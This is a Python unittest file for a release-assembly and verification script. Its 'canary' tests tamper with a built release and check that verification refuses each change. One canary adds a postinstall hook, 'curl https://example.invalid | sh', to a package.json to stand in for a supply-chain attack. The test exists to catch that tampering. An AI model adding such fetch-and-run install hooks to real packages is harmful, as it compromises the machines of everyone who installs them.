#!/usr/bin/env python3
"""assemble.py: a release is built from one commit, and `verify` refuses
anything it cannot vouch for. Each canary alters one thing in a good release."""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import assemble  # noqa: E402

SCRIPT = Path(assemble.__file__)
TOOL = assemble.TOOL


class Release(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)
        self.repo = self.root / "repo"
        self.repo.mkdir()
        self.git("init", "-q", "-b", "main")
        self.git("config", "user.email", "test@example.invalid")
        self.git("config", "user.name", "test")
        self.source("LICENSE", "Apache-2.0\n")
        self.source("NOTICE", "Norn\n")
        self.source(f"{TOOL}/package.json", json.dumps({
            "name": "@norn/authoring", "version": "0.1.0-alpha.3", "private": True, "license": "Apache-2.0",
            "types": "./profile/norn-authoring.d.ts", "exports": {".": {"types": "./profile/norn-authoring.d.ts"}},
            "bin": {"norn": "./src/cli.ts"}, "dependencies": {"effect": "4.0.0-rc.117", "typescript": "6.0.3"}}))
        self.source(f"{TOOL}/src/cli.ts", "#!/usr/bin/env bun\n")
        self.source(f"{TOOL}/src/builder/index.ts", "export {}\n")
        self.source(f"{TOOL}/profile/norn-authoring.d.ts", 'declare module "@norn/authoring" {}\n')
        self.source(f"{TOOL}/schema/norn-project.schema.json", "{}\n")
        self.source(f"{TOOL}/templates/starter/src/product.ts", "export {}\n")
        self.source(f"{TOOL}/tsconfig.authoring.json", "{}\n")
        self.source(f"{TOOL}/test/x.test.ts", "never shipped\n")
        self.source(assemble.LIMITS[1], "{}\n")
        self.git("update-index", "--add", "--chmod=+x", f"{TOOL}/src/cli.ts")
        self.git("commit", "-q", "-m", "release")
        self.commit = self.git("rev-parse", "HEAD")
        self.wasm = self.root / "wasm"
        self.wasm.mkdir()
        for name in assemble.CHECKER:
            (self.wasm / name).write_bytes(b"\0asm" + name.encode())
        self.hosts = self.root / "hosts"
        for platform, facts in assemble.PLATFORMS.items():
            (self.hosts / facts["target"]).mkdir(parents=True)
            (self.hosts / facts["target"] / "norn-dev-host").write_bytes(b"\x7fELF" + platform.encode())
        self.licenses = self.root / "THIRD-PARTY-LICENSES"
        self.licenses.write_text("licenses\n")
        self.out = self.root / "out"

    def tearDown(self):
        self.temporary.cleanup()

    def git(self, *args):
        return subprocess.run(["git", *args], cwd=self.repo, check=True, capture_output=True, text=True).stdout.strip()

    def source(self, path, text):
        target = self.repo / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)
        self.git("add", path)

    def run_script(self, command, *extra):
        return subprocess.run([sys.executable, str(SCRIPT), command, "--commit", self.commit, "--repo", str(self.repo),
                               "--out", str(self.out), *extra], capture_output=True, text=True)

    BASE_URL = "https://example.invalid/releases/v0.1.0-alpha.3"

    def inputs(self, channel="tarball", base_url=None):
        """The release inputs a caller passes; verify takes them from the caller, not from the files."""
        url = self.BASE_URL if channel == "tarball" and base_url is None else (base_url or "")
        return ["--channel", channel, "--toolchain", "1.98.0", "--platforms", "linux-x64,linux-arm64",
                *(["--base-url", url] if url else [])]

    def build(self, channel="tarball"):
        self.channel = channel
        result = self.run_script("build", "--wasm", str(self.wasm), "--hosts", str(self.hosts),
                                 "--third-party", str(self.licenses), *self.inputs(channel))
        self.assertEqual(result.returncode, 0, result.stderr)

    def verify(self, *inputs):
        return self.run_script("verify", *(inputs or self.inputs(self.channel)))

    def refused(self, why, *inputs):
        result = self.verify(*inputs)
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn(why, result.stderr)

    def package(self, name):
        return self.out / "packages" / assemble.package_dir(name)

    def test_a_release_is_the_commit_and_the_listed_built_files(self):
        self.build()
        cli = self.package("@norn/cli")
        self.assertEqual((cli / "src/cli.ts").read_text(), "#!/usr/bin/env bun\n")
        self.assertTrue((cli / "src/cli.ts").stat().st_mode & 0o100)
        self.assertFalse((cli / "test").exists())
        self.assertEqual((cli / assemble.LIMITS[0]).read_text(), "{}\n")
        manifest = json.loads((cli / "package.json").read_text())
        self.assertEqual((manifest["name"], manifest["version"]), ("@norn/cli", "0.1.0-alpha.3"))
        self.assertNotIn("private", manifest)
        self.assertNotIn("optionalDependencies", manifest)
        self.assertEqual(manifest["engines"], {"bun": ">=1.3.0 <1.4.0"})
        authoring = json.loads((self.package("@norn/authoring") / "package.json").read_text())
        self.assertNotIn("./schema/norn-project.schema.json", authoring["exports"])
        info = json.loads((cli / "generated/build.json").read_text())
        self.assertEqual((info["version"], info["commit"], info["toolchain"]), ("0.1.0-alpha.3", self.commit, "1.98.0"))
        self.assertEqual(info["packages"]["@norn/cli"], "https://example.invalid/releases/v0.1.0-alpha.3/norn-cli-0.1.0-alpha.3.tgz")
        self.assertEqual(sorted(info["hosts"]), sorted(assemble.PLATFORMS))
        host = self.package("@norn/dev-host-linux-x64")
        self.assertEqual(json.loads((host / "package.json").read_text())["cpu"], ["x64"])
        self.assertTrue((host / "bin/norn-dev-host").stat().st_mode & 0o100)
        released = json.loads((self.out / "release/manifest.json").read_text())
        self.assertEqual(sorted(released["files"]), sorted([
            "norn-authoring-0.1.0-alpha.3.tgz", "norn-cli-0.1.0-alpha.3.tgz", "norn-dev-host-linux-arm64",
            "norn-dev-host-linux-arm64-0.1.0-alpha.3.tgz", "norn-dev-host-linux-x64", "norn-dev-host-linux-x64-0.1.0-alpha.3.tgz"]))
        self.assertEqual(info["hosts"]["linux-x64"]["sha256"], released["files"]["norn-dev-host-linux-x64"]["sha256"])
        # Verifying again, alone, passes; and building twice gives the same bytes.
        self.assertEqual(self.verify().returncode, 0)
        first = (self.out / "release/SHA256SUMS").read_text()
        self.build()
        self.assertEqual((self.out / "release/SHA256SUMS").read_text(), first)

    def test_the_registry_channel_names_versions_and_platform_packages(self):
        self.build("registry")
        manifest = json.loads((self.package("@norn/cli") / "package.json").read_text())
        self.assertEqual(manifest["optionalDependencies"], {"@norn/dev-host-linux-arm64": "0.1.0-alpha.3", "@norn/dev-host-linux-x64": "0.1.0-alpha.3"})
        info = json.loads((self.package("@norn/cli") / "generated/build.json").read_text())
        self.assertEqual(info["packages"], {"@norn/cli": "0.1.0-alpha.3", "@norn/authoring": "0.1.0-alpha.3"})
        # Host digests ride in the build manifest on both channels; only tarballs have an address.
        self.assertEqual(sorted(info["hosts"]), sorted(assemble.PLATFORMS))
        self.assertNotIn("url", info["hosts"]["linux-x64"])

    def repack(self, name):
        directory = self.package(name)
        (self.out / "release" / assemble.tarball_name(name, "0.1.0-alpha.3")).write_bytes(assemble.pack(directory))

    def reseal(self):
        """Re-record every release file's hash in the manifest and SHA256SUMS, as
        someone altering a release would: the check under test must still refuse."""
        path = self.out / "release/manifest.json"
        manifest = json.loads(path.read_text())
        for name in manifest["files"]:
            data = (self.out / "release" / name).read_bytes()
            manifest["files"][name] = {"sha256": assemble.sha256(data), "size": len(data)}
        path.write_text(json.dumps(manifest, indent=2) + "\n")
        (self.out / "release/SHA256SUMS").write_text("".join(f"{e['sha256']}  {n}\n" for n, e in manifest["files"].items()))

    def test_canary_an_extra_untracked_file_in_a_package(self):
        self.build()
        (self.package("@norn/cli") / "src/extra.ts").write_text("not in the commit\n")
        self.repack("@norn/cli")
        self.refused("src/extra.ts is neither a tracked source file nor a listed built file")

    def test_canary_a_tracked_file_altered_by_one_byte(self):
        self.build()
        target = self.package("@norn/authoring") / "src/builder/index.ts"
        target.write_bytes(target.read_bytes()[:-1] + b"!")
        self.repack("@norn/authoring")
        self.refused(f"src/builder/index.ts is not byte-identical to {TOOL}/src/builder/index.ts")

    def test_canary_an_unlisted_built_file(self):
        self.build()
        (self.package("@norn/cli") / "checker/extra.wasm").write_bytes(b"\0asm")
        self.repack("@norn/cli")
        self.refused("checker/extra.wasm is neither a tracked source file nor a listed built file")
        (self.package("@norn/cli") / "checker/extra.wasm").unlink()
        (self.package("@norn/cli") / "checker/norn_checker_wasm_bg.wasm").unlink()
        self.repack("@norn/cli")
        self.refused("checker/norn_checker_wasm_bg.wasm is missing")

    def test_canary_a_postinstall_script_added_to_a_package_json(self):
        self.build()
        path = self.package("@norn/cli") / "package.json"
        manifest = json.loads(path.read_text())
        manifest["scripts"] = {"postinstall": "curl https://example.invalid | sh"}
        path.write_text(json.dumps(manifest, indent=2) + "\n")
        self.repack("@norn/cli")
        self.reseal()
        self.refused("@norn/cli: package.json is not the one this commit and release produce")

    def test_canary_the_cli_address_in_build_json_pointed_elsewhere(self):
        self.build()
        path = self.package("@norn/cli") / "generated/build.json"
        info = json.loads(path.read_text())
        info["packages"]["@norn/cli"] = "https://elsewhere.invalid/norn-cli.tgz"
        path.write_text(json.dumps(info, indent=2) + "\n")
        self.repack("@norn/cli")
        self.reseal()
        self.refused("generated/build.json is not the one this commit and release produce")

    def test_canary_a_symlink_among_built_files(self):
        self.build()
        wasm = self.package("@norn/cli") / "checker/norn_checker_wasm_bg.wasm"
        wasm.unlink()
        wasm.symlink_to(self.root / "elsewhere.wasm")
        self.refused("is a symlink")

    def test_a_tarball_is_compared_by_its_content_not_its_gzip_bytes(self):
        import gzip
        self.build()
        tarball = self.out / "release" / assemble.tarball_name("@norn/authoring", "0.1.0-alpha.3")
        recompressed = gzip.compress(gzip.decompress(tarball.read_bytes()), compresslevel=1, mtime=0)
        self.assertNotEqual(recompressed, tarball.read_bytes())
        tarball.write_bytes(recompressed)
        self.reseal()
        result = self.verify()
        self.assertEqual(result.returncode, 0, result.stderr)

    def rewrite(self, path, change):
        data = json.loads(path.read_text())
        change(data)
        path.write_text(json.dumps(data, indent=2) + "\n")

    def test_canary_the_base_url_changed_in_both_manifest_and_build_json(self):
        self.build()
        elsewhere = "https://elsewhere.invalid/releases/v0.1.0-alpha.3"
        def point(info):
            info["packages"] = {name: url.replace(self.BASE_URL, elsewhere) for name, url in info["packages"].items()}
            for host in info["hosts"].values():
                host["url"] = host["url"].replace(self.BASE_URL, elsewhere)
        self.rewrite(self.package("@norn/cli") / "generated/build.json", point)
        self.repack("@norn/cli")
        self.rewrite(self.out / "release/manifest.json", lambda m: m.update(baseUrl=elsewhere))
        self.reseal()
        # Consistent with itself, and still refused: the address is the caller's, not the manifest's.
        self.refused("release/manifest.json is not for this release: baseUrl differ")
        # The same files pass only for a caller that asked for that address.
        self.assertEqual(self.verify(*self.inputs("tarball", elsewhere)).returncode, 0)

    def test_canary_a_version_changed_everywhere_the_release_states_it(self):
        self.build()
        other = "0.1.0-alpha.9"
        for name in ("@norn/cli", "@norn/authoring"):
            self.rewrite(self.package(name) / "package.json", lambda m: m.update(version=other))
        self.rewrite(self.package("@norn/cli") / "generated/build.json", lambda i: i.update(version=other))
        for name in ("@norn/cli", "@norn/authoring"):
            self.repack(name)
        self.rewrite(self.out / "release/manifest.json", lambda m: m.update(version=other))
        self.reseal()
        # The version is the commit's: nothing in the release can restate it.
        self.refused("version differ")

    def test_canary_a_channel_flip(self):
        self.build()
        # Tarball files presented as the registry release.
        self.refused("baseUrl, channel differ", *self.inputs("registry"))
        # And the manifest rewritten to say registry, checked against the caller's tarball inputs.
        self.rewrite(self.out / "release/manifest.json", lambda m: m.update(channel="registry", baseUrl=""))
        self.reseal()
        self.refused("baseUrl, channel differ")

    def test_verify_refuses_inputs_it_cannot_build(self):
        self.build()
        self.refused("takes no --base-url", "--channel", "registry", "--toolchain", "1.98.0", "--platforms", "linux-x64,linux-arm64", "--base-url", self.BASE_URL)
        self.refused("is not an exact Rust version", *self.inputs()[:2], "--toolchain", "stable", "--platforms", "linux-x64", "--base-url", self.BASE_URL)
        self.refused("must name distinct prebuilt platforms", *self.inputs()[:4], "--platforms", "linux-x64,darwin-arm64", "--base-url", self.BASE_URL)

    def test_canary_a_host_dropped_consistently(self):
        """Every trace of the arm64 host removed and every record resealed: the caller's platforms still need it."""
        import shutil
        self.build()
        shutil.rmtree(self.package("@norn/dev-host-linux-arm64"))
        for name in ("norn-dev-host-linux-arm64", assemble.tarball_name("@norn/dev-host-linux-arm64", "0.1.0-alpha.3")):
            (self.out / "release" / name).unlink()
        self.rewrite(self.package("@norn/cli") / "generated/build.json", lambda info: info["hosts"].pop("linux-arm64"))
        self.repack("@norn/cli")
        self.rewrite(self.out / "release/manifest.json", lambda m: [m["files"].pop(n) for n in list(m["files"]) if "arm64" in n])
        self.reseal()
        self.refused("not the CLI, the authoring profile and the hosts for linux-arm64, linux-x64")
        # The same files are a consistent x64-only release for a caller that asked for one.
        self.assertEqual(self.verify("--channel", "tarball", "--toolchain", "1.98.0", "--platforms", "linux-x64", "--base-url", self.BASE_URL).returncode, 0)

    def test_canary_a_manifest_that_is_not_an_object(self):
        self.build()
        (self.out / "release/manifest.json").write_text("[]\n")
        self.refused("release/manifest.json is a JSON list, not an object")

    def test_build_takes_exactly_the_named_platforms(self):
        result = self.run_script("build", "--wasm", str(self.wasm), "--hosts", str(self.hosts), "--third-party", str(self.licenses),
                                 "--channel", "registry", "--toolchain", "1.98.0", "--platforms", "linux-x64")
        self.assertEqual(result.returncode, 1)
        self.assertIn("for exactly x86_64-unknown-linux-musl", result.stderr)

    def test_canary_a_release_tarball_that_is_not_gzip(self):
        self.build()
        (self.out / "release" / assemble.tarball_name("@norn/authoring", "0.1.0-alpha.3")).write_bytes(b"not a gzip stream")
        self.reseal()
        self.refused("release/norn-authoring-0.1.0-alpha.3.tgz is not a gzip stream")

    def test_a_release_address_is_https_or_this_machine(self):
        for url in ("http://example.invalid/r", "ftp://x/y", "https://x/y/"):
            self.assertIsNone(assemble.RELEASE_URL.fullmatch(url), url)
        for url in ("https://github.com/Norn-cloud/norn/releases/download/v0.1.0-alpha.3", "http://127.0.0.1:8377", "http://localhost/x"):
            self.assertIsNotNone(assemble.RELEASE_URL.fullmatch(url), url)

    def test_canary_a_missing_manifest_entry(self):
        self.build()
        path = self.out / "release/manifest.json"
        manifest = json.loads(path.read_text())
        del manifest["files"]["norn-dev-host-linux-arm64"]
        path.write_text(json.dumps(manifest))
        self.refused("must list exactly")

    def test_canary_a_release_file_that_differs_from_its_recorded_hash(self):
        self.build()
        (self.out / "release/norn-dev-host-linux-x64").write_bytes(b"\x7fELF another host")
        self.refused("release/norn-dev-host-linux-x64 does not match its manifest or SHA256SUMS entry")

    def test_canary_a_file_in_the_release_that_no_manifest_lists(self):
        self.build()
        (self.out / "release/unlisted.tgz").write_bytes(b"")
        self.refused("must list exactly")

    def test_a_working_tree_edit_never_reaches_a_package(self):
        (self.repo / TOOL / "src/cli.ts").write_text("edited after the commit\n")
        self.build()
        self.assertEqual((self.package("@norn/cli") / "src/cli.ts").read_text(), "#!/usr/bin/env bun\n")

    def test_builds_refuse_what_they_cannot_name(self):
        (self.hosts / "x86_64-pc-windows-msvc").mkdir()
        result = self.run_script("build", "--wasm", str(self.wasm), "--hosts", str(self.hosts), "--third-party", str(self.licenses),
                                 "--channel", "registry", "--toolchain", "1.98.0", "--platforms", "linux-x64,linux-arm64")
        self.assertEqual(result.returncode, 1)
        self.assertIn("found aarch64-unknown-linux-musl, x86_64-pc-windows-msvc", result.stderr)
        (self.hosts / "x86_64-pc-windows-msvc").rmdir()
        result = self.run_script("build", "--wasm", str(self.wasm), "--hosts", str(self.hosts), "--third-party", str(self.licenses),
                                 "--channel", "tarball", "--toolchain", "1.98.0", "--platforms", "linux-x64,linux-arm64")
        self.assertEqual(result.returncode, 1)
        self.assertIn("--base-url", result.stderr)


if __name__ == "__main__":
    unittest.main()
